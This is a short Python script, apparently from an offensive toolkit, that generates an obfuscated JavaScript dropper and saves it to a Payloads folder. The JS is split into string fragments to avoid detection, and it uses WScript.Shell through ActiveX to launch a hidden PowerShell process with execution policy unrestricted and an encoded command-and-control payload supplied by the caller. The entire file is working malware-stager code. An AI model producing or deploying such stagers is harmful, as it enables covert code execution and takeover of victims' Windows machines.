#!/usr/bin/python3

def payload_gen(_Name, _C2Payload):
    vPAY = "./Payloads/" + _Name + ".txt"
    try:
        payload = "var a='WSc' +"
        payload += "'ript.Sh' +"
        payload += "'ell';var b = 'ne' +"
        payload += "'w Ac' + 'tiveXO' +"
        payload += "'bjec' + 't(a).Ru' +"
        payload += "'n(c);';var z='po' +"
        payload += "'wers' + 'h' +"
        payload += "'ell';var c= z +"
        payload += "'.e' + 'xe -No' +"
        payload += "'P -sta -N' +"
        payload += "'onI -W Hidd' +"
        payload += "'en -e' +"
        payload += "'x' +"
        payload += "'e' +"
        payload += "'c un' +"
        payload += "'rest' +"
        payload += "'rict' +"
        payload += "'ed -En' +"
        payload += "'c ' +"
        payload += " '"
        payload += str(_C2Payload)
        payload += "'"
        payload += ";eval(b);"

        pf = open(vPAY, "w+")
        pf.write(payload)
        pf.close()

    except Exception as e:
        print('\n[!] Error, Unable to write JS payload.')
        print(' Yielded the following error %s' % e)
